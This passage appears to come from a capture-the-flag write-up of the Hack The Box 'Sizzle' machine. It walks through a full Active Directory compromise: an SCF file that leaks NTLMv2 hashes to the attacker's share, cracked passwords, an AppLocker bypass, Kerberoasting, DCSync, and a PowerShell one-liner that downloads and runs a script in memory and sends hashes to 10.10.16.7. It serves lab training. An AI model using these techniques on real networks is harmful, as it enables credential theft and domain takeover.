+<p>Spidering with <code class="language-plaintext highlighter-rouge">gobuster</code> shows an interesting directory <code class="language-plaintext highlighter-rouge">/certsrv</code> which indicates that the <strong>ADCS role</strong> is installed on this server. We note this down.</p>
+
+<p><img src="/assets/Sizzle/gobuser-output.jpg" alt="gobuser-output" /></p>
+
+<p>the <strong>HTTPS</strong> website is similar in structure. so we move along.</p>
+
+<h3 id="ldap">LDAP</h3>
+<p>The output of <code class="language-plaintext highlighter-rouge">ldapsearch</code> didn’t show much information.</p>
+
+<p><img src="/assets/Sizzle/ldapsearch-output.jpg" alt="ldapsearch-output" /></p>
+
+<p>(<em>I grepped out some unnecessary lines from the output to make it smaller.</em>)</p>
+
+<h3 id="smb">SMB</h3>
+<p>Enumerating SMB with <code class="language-plaintext highlighter-rouge">crackmapexec</code> reveals that we have <code class="language-plaintext highlighter-rouge">read</code> access to the <code class="language-plaintext highlighter-rouge">Department Shares</code> folder.</p>
+
+<p><img src="/assets/Sizzle/cme-smb-share-enum.jpg" alt="cme-smb-share-enum" /></p>
+
+<p><em>After mounting it,</em> we notice a couple of folders:</p>
+
+<p><img src="/assets/Sizzle/dpt-shares-folders.jpg" alt="dpt-shares-folders" /></p>
+
+<p>the <code class="language-plaintext highlighter-rouge">Users</code> folder contained some usernames which we save in a list for later use:</p>
+
+<p><img src="/assets/Sizzle/userlist-from-smb.jpg" alt="userlist-from-smb" /></p>
+
+<p>We find some files in the <code class="language-plaintext highlighter-rouge">ZZ_ARCHIVE</code> folder but they dont have any content:</p>
+
+<p><img src="/assets/Sizzle/zz-archive-files.jpg" alt="zz-archive-files" /></p>
+
+<p>we loop over the files using the <code class="language-plaintext highlighter-rouge">file</code> command and <code class="language-plaintext highlighter-rouge">grep</code> out any empty hex line with <code class="language-plaintext highlighter-rouge">xxd</code> to find nothing there as well.</p>
+
+<p><img src="/assets/Sizzle/checking_zz_archive.jpg" alt="checking_zz_archive" /></p>
+
+<p><em>Since we were nearing a dead end with our enumeration,</em> we’re going to use a simple <code class="language-plaintext highlighter-rouge">bash</code> script to check for <code class="language-plaintext highlighter-rouge">write</code> access in the SMB share.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nv">list</span><span class="o">=</span><span class="si">$(</span>find /mnt <span class="nt">-type</span> d<span class="si">)</span>
+<span class="k">for </span>d <span class="k">in</span> <span class="nv">$list</span>
+<span class="k">do
+        </span><span class="nb">touch</span> <span class="nv">$d</span>/just-a-test-dir 2&gt;/dev/null
+        <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
+        <span class="k">then
+                </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\e</span><span class="s2">[32m[+] </span><span class="nv">$d</span><span class="s2"> is writable</span><span class="se">\e</span><span class="s2">[0m"</span>
+                <span class="nb">rm</span> <span class="nv">$d</span>/just-a-test-dir
+        <span class="k">else
+                </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\e</span><span class="s2">[31m[-] </span><span class="nv">$d</span><span class="s2"> is not writable</span><span class="se">\e</span><span class="s2">[0m"</span>
+        <span class="k">fi
+done</span>
+</code></pre></div></div>
+
+<ol>
+  <li>it does a <code class="language-plaintext highlighter-rouge">find</code> on the mount point with the <code class="language-plaintext highlighter-rouge">-type d</code> flag to get <em>only directories</em>.</li>
+  <li>then attempts to create a file in each one using <code class="language-plaintext highlighter-rouge">touch</code></li>
+  <li>It prints out if the folder is writable or not</li>
+  <li>then clears the test file if the folder is writable.</li>
+</ol>
+
+<p><img src="/assets/Sizzle/check-write-script-results.jpg" alt="check-write-script-results" /></p>
+
+<p>The results show that we have <code class="language-plaintext highlighter-rouge">write</code> access in both the <code class="language-plaintext highlighter-rouge">Public</code> and <code class="language-plaintext highlighter-rouge">ZZ_ARCHIVE</code> folders.</p>
+
+<p>Having this access would allow us to <em>plant a malicious type of file</em> that would enable us to <em>steal</em> <strong>NTLMv2 hashes</strong> from users who access these locations.</p>
+
+<h3 id="scf-file-attacks-for-hash-theft">SCF File Attacks for Hash Theft</h3>
+<p>SCF (Shell Command Files) are files that can perform actions in <strong>Windows Explorer</strong>. One functionality can be <em>abused</em> to have the <em>share-visiting</em> user <em>directed</em> to our kali machine.</p>
+
+<p>This can be done using a file with the below content:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Shell]
+Command=2
+IconFile=\\10.10.16.7\share\pwn.ico
+[Taskbar]
+Command=ToggleDesktop
+</code></pre></div></div>
+
+<p><em>Essentially,</em> this tells <strong>File Explorer</strong> to <em>fetch</em> the icon for the <code class="language-plaintext highlighter-rouge">.scf</code> file from a network share (<em>our kali box in this case</em>).</p>
+
+<p>We’re going to fire up <code class="language-plaintext highlighter-rouge">responder</code> making sure the <code class="language-plaintext highlighter-rouge">Responder.conf</code> file has the <code class="language-plaintext highlighter-rouge">SMB</code> server set to <code class="language-plaintext highlighter-rouge">ON</code>.</p>
+
+<p>And then copy the <code class="language-plaintext highlighter-rouge">.scf</code> file to <code class="language-plaintext highlighter-rouge">\\10.10.10.103\Department Shares\Users\Public</code> as well as the <code class="language-plaintext highlighter-rouge">ZZ_ARCHIVE</code> folders to make sure any visitor gives us his/her hash.</p>
+
+<p><img src="/assets/Sizzle/amanda-hash-captured.jpg" alt="amanda-hash-captured" /></p>
+
+<p>We manage to get a response from the <code class="language-plaintext highlighter-rouge">amanda</code> user right away :D</p>
+
+<p>We then get to cracking with <code class="language-plaintext highlighter-rouge">john</code></p>
+
+<p><img src="/assets/Sizzle/amanda-hash-cracked.jpg" alt="amanda-hash-cracked" /></p>
+
+<p>the password turns out to be <code class="language-plaintext highlighter-rouge">Ashare1972</code></p>
+
+<h3 id="the-winrm-situation">The WinRM situation</h3>
+<p>We first validate the creds for <code class="language-plaintext highlighter-rouge">amanda</code> with <code class="language-plaintext highlighter-rouge">crackmapexec</code> via SMB and they work.</p>
+
+<p>So we try WinRM after but end up with a weird error message:</p>
+
+<p><img src="/assets/Sizzle/cme-smb-yes-winrm-no.jpg" alt="cme-smb-yes-winrm-no" /></p>
+
+<p>at this moment, I wasn’t quite sure what to do. So I moved on to try other things.</p>
+
+<h3 id="domain-enumeration-with-bloodhoundpy">Domain Enumeration With BloodHound.py</h3>
+<p><em>Since I didn’t have code execution,</em> I turned to the <strong>Python</strong> version of <code class="language-plaintext highlighter-rouge">BloodHound</code> to do enumeration with all collection methods:</p>
+
+<p><img src="/assets/Sizzle/bloodhound-py.jpg" alt="bloodhound-py" /></p>
+
+<p><em>Viewing the</em> <code class="language-plaintext highlighter-rouge">amanda</code> <em>user,</em> I saw she did have <strong>PowerShell Remoting</strong> capability when I ran the <code class="language-plaintext highlighter-rouge">Shortest Path from Owned Principles</code> query.</p>
+
+<p><img src="/assets/Sizzle/amanda-can-ps-remote.jpg" alt="amanda-can-ps-remote" /></p>
+
+<h3 id="getting-winrm-to-work">Getting WinRM to work</h3>
+<p><em>Since we have access to the</em> <code class="language-plaintext highlighter-rouge">amanda</code> <em>user’s credentials,</em> we can <em>request</em> a <strong>User Certificate</strong> from <strong>AD Certificate Services.</strong></p>
+
+<p>This can be done after authenticating to <code class="language-plaintext highlighter-rouge">http://10.10.10.103/certsrv</code> and submitting a <strong>Certificate Signing Request</strong> (<strong>CSR</strong> for short).</p>
+
+<p><em>Before visiting the</em> <strong>ADCS</strong> <em>page,</em> we would need to get a <strong>key</strong> and a <strong>CSR</strong>. This can be done using <code class="language-plaintext highlighter-rouge">openssl</code>.</p>
+
+<p>The command should be as below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req <span class="nt">-newkey</span> rsa:2048 <span class="nt">-keyout</span> amanda.key <span class="nt">-out</span> amanda.csr
+</code></pre></div></div>
+
+<p><img src="/assets/Sizzle/gen-key-gen-csr.jpg" alt="gen-key-gen-csr" /></p>
+
+<p>Note the contents of the <code class="language-plaintext highlighter-rouge">.csr</code> file:</p>
+
+<p><img src="/assets/Sizzle/amanda-csr.jpg" alt="amanda-csr" /></p>
+
+<p>We now visit the page:</p>
+
+<p><img src="/assets/Sizzle/cert-srv-1.jpg" alt="cert-srv-1" /></p>
+
+<p><img src="/assets/Sizzle/cert-srv-2.jpg" alt="cert-srv-2" /></p>
+
+<p>we then paste what we copied from <code class="language-plaintext highlighter-rouge">amanda.csr</code></p>
+
+<p><img src="/assets/Sizzle/cert-srv-3.jpg" alt="cert-srv-3" /></p>
+
+<p>And we select the <strong>Base 64 encoded version</strong> and download it.</p>
+
+<p><img src="/assets/Sizzle/cert-srv-4.jpg" alt="cert-srv-4" /></p>
+
+<p><em>Having done all this,</em> we just need to hook both the <code class="language-plaintext highlighter-rouge">.key</code> file and the <code class="language-plaintext highlighter-rouge">.cer</code> we got from <strong>ADCS</strong> to <code class="language-plaintext highlighter-rouge">evil-winrm</code> while using the <code class="language-plaintext highlighter-rouge">-S</code> flag for SSL.</p>
+
+<p>We know so from checking the help:</p>
+
+<p><img src="/assets/Sizzle/evil-winrm-help.jpg" alt="evil-winrm-help" /></p>
+
+<p>And it works like a charm :D</p>
+
+<p><img src="/assets/Sizzle/winrm-success-amanda.jpg" alt="winrm-success-amanda" /></p>
+
+<p>Note: the PEM pass phrase is the one you were asked to enter when generating the private key and CSR with <code class="language-plaintext highlighter-rouge">openssl</code></p>
+
+<h3 id="back-to-bloodhound-graphs-kerberoastable-users">Back to <code class="language-plaintext highlighter-rouge">BloodHound</code> graphs: Kerberoastable Users</h3>
+<p>Inspecting the query <code class="language-plaintext highlighter-rouge">List all Kerberoastable Accounts</code> shows us that a user called <code class="language-plaintext highlighter-rouge">mrlky</code> is vulnerable.</p>
+
+<p><img src="/assets/Sizzle/mrlky-kerberoastable.jpg" alt="mrlky-kerberoastable" /></p>
+
+<p>That user is very special since he has the 2 required rights to perform a <code class="language-plaintext highlighter-rouge">DCSync</code> attack:</p>
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">GetChanges</code></li>
+  <li><code class="language-plaintext highlighter-rouge">GetChangesAll</code></li>
+</ol>
+
+<p><img src="/assets/Sizzle/mrlky-can-dcsync.jpg" alt="mrlky-can-dcsync" /></p>
+
+<p><em>Hence,</em> we need to kerberoast this guy and get his TGS hash :D</p>
+
+<h3 id="roasting-with-rubeus-bypassing-applocker-and-performing-network-authentication">Roasting with Rubeus: Bypassing Applocker and Performing Network Authentication</h3>
+<p><em>After copying</em> <code class="language-plaintext highlighter-rouge">Rubeus.exe</code> <em>from our kali machine over to</em> <code class="language-plaintext highlighter-rouge">amanda</code>‘<em>s documents folder</em>, we find that we can’t execute due to <strong>Applocker.</strong></p>
+
+<p><img src="/assets/Sizzle/rubeus-applocked.jpg" alt="rubeus-applocked" /></p>
+
+<p>Moving it to <code class="language-plaintext highlighter-rouge">c:\windows\temp</code> directory works as a bypass. But we get another error:</p>
+
+<p><img src="/assets/Sizzle/rubeus-no-net-logon.jpg" alt="rubeus-no-net-logon" /></p>
+
+<p>This is because we logged in using a different way: user certificate.</p>
+
+<p><em>In order to carry out this attack,</em> we would need to authenticate to the network.</p>
+
+<p>This can be done using the <code class="language-plaintext highlighter-rouge">/creduser</code>, <code class="language-plaintext highlighter-rouge">/credpassword</code> and <code class="language-plaintext highlighter-rouge">/domain</code> switches in <code class="language-plaintext highlighter-rouge">Rubeus.exe</code>.</p>
+
+<p>The command is: <code class="language-plaintext highlighter-rouge">.\rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972 /domain:htb.local</code></p>
+
+<p><img src="/assets/Sizzle/mrlky-kerberoasted.jpg" alt="mrlky-kerberoasted" /></p>
+
+<p>We’re good! :D</p>
+
+<p>Now we crack the hash for <code class="language-plaintext highlighter-rouge">mrkly</code> again with <code class="language-plaintext highlighter-rouge">john</code>:</p>
+
+<p><img src="/assets/Sizzle/mrlky-cracked.jpg" alt="mrlky-cracked" /></p>
+
+<h3 id="dcsync">DCSync</h3>
+<p><em>Having the password for</em> <code class="language-plaintext highlighter-rouge">mrkly</code>: <code class="language-plaintext highlighter-rouge">Football#7</code>, we’re going to use <code class="language-plaintext highlighter-rouge">Impacket</code>’s <code class="language-plaintext highlighter-rouge">secretsdump.py</code> python script to do a <code class="language-plaintext highlighter-rouge">DCSync</code> attack:</p>
+
+<p><img src="/assets/Sizzle/dcsynced.jpg" alt="dcsynced" /></p>
+
+<p>and follow up with <code class="language-plaintext highlighter-rouge">psexec.py</code> for a quick <strong>Pass-The-Hash</strong> attack to get code execution as <code class="language-plaintext highlighter-rouge">NT Authority\System</code>:</p>
+
+<p><img src="/assets/Sizzle/got-system.jpg" alt="got-system" /></p>
+
+<h3 id="bonus-powershell-constrained-language-mode-bypassing-it-along-with-applocker-and-kerberoasting-without-touching-disk-all-in-a-powershell-one-liner-d">Bonus: PowerShell Constrained Language Mode, Bypassing it along with Applocker and Kerberoasting without touching disk. All in a PowerShell one-liner :D</h3>
+<p>After I initially got the WinRM shell, It kept asking for my PEM pass phrase after each command.</p>
+
+<p>I wanted to get a <code class="language-plaintext highlighter-rouge">nishang</code> shell but couldn’t do the <code class="language-plaintext highlighter-rouge">IEX</code> command (<code class="language-plaintext highlighter-rouge">Invoke-Expression</code>). This was because of <strong>PowerShell’s Contrained Language Mode</strong>.</p>
+
+<p><img src="/assets/Sizzle/constrained-language-mode.jpg" alt="constrained-language-mode" /></p>
+
+<p><strong>Contrained Language Mode</strong> disables a few PowerShell commands that can be dangerous.</p>
+
+<p><em>Fortunately,</em> it can be bypassed by <em>downgrading</em> to <strong>PowerShell</strong> version 2.</p>
+
+<p>We’re going to be abusing the <code class="language-plaintext highlighter-rouge">Start-Process</code> command to start a <code class="language-plaintext highlighter-rouge">powershell.exe</code> with <code class="language-plaintext highlighter-rouge">-v 2</code> and the command <code class="language-plaintext highlighter-rouge">-c IEX(New-Object Net.webClient).downloadString('http://10.10.16.7/Invoke-Kerberoast.ps1')</code> as arguments.</p>
+
+<p>This is to:</p>
+<ol>
+  <li>Start a <strong>PowerShell</strong> version 2 process without locking the terminal.</li>
+  <li>Import the <code class="language-plaintext highlighter-rouge">Invoke-Kerberoast</code> code into memory.</li>
+  <li>Execute the command <code class="language-plaintext highlighter-rouge">Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII \\10.10.16.7\share\roasted.txt</code>.</li>
+  <li>Output the TGS hash of the <code class="language-plaintext highlighter-rouge">mrlky</code> user to our SMB share.</li>
+</ol>
+
+<p>we will use the <code class="language-plaintext highlighter-rouge">-Credential</code> parameter with <code class="language-plaintext highlighter-rouge">Start-Process</code> to create the Network Authentication needed for the attack to succeed.</p>
+
+<p><em>That way,</em> we’ve hit multiple birds with one stone.</p>
+<ol>
+  <li>We never had to deal with <strong>Applocker</strong></li>
+  <li>Dodged <strong>Contrained Language Mode</strong></li>
+  <li>Created the needed <strong>Network Logon</strong></li>
+  <li><strong>Kerberoasted</strong> <em>without ever touching the victim’s disk</em></li>
+</ol>
+
+<p><img src="/assets/Sizzle/bonus-kill.jpg" alt="bonus-kill" /></p>
+
+<h3 id="joke-section-pwning-the-box-with-zerologon-xd">Joke Section: Pwning the box with <code class="language-plaintext highlighter-rouge">ZeroLogon</code> XD</h3>
+
+<p>You could do all of the above.</p>
+
+<p>OR…</p>
+
+<p><img src="/assets/Sizzle/zero-logon-XD.jpg" alt="zero-logon-XD" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
